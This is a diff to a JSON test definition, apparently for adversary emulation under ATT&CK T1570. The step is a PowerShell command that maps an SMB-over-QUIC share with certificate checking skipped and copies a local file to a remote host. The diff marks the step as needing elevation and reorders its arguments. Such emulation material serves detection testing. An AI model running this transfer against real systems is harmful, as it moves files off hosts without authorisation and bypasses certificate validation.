@@ -7,31 +7,30 @@
   ],
   "steps": [
     {
-      "id": "20d03c8b-9d2b-473c-b163-160d5479acb6",
+      "id": "468a533e-d448-4ac6-bcbf-12763403ca8d",
       "type": "execute-command",
       "data": {
         "command": "New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\ncopy '#{local_file}' 'Z:\\'\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "tags": [
-    "T1570",
-    "atomic-red-team"
+    "T1570"
   ],
   "input_arguments": [
-    {
-      "name": "remote_path",
-      "type": "string",
-      "description": "The UNC path to the share on the file server",
-      "value": "\\\\example.com\\sales"
-    },
     {
       "name": "local_file",
       "type": "path",
       "description": "The local file to be transferred",
       "value": "C:\\path\\to\\file.txt"
+    },
+    {
+      "name": "remote_path",
+      "type": "string",
+      "description": "The UNC path to the share on the file server",
+      "value": "\\\\example.com\\sales"
     }
   ]
 }
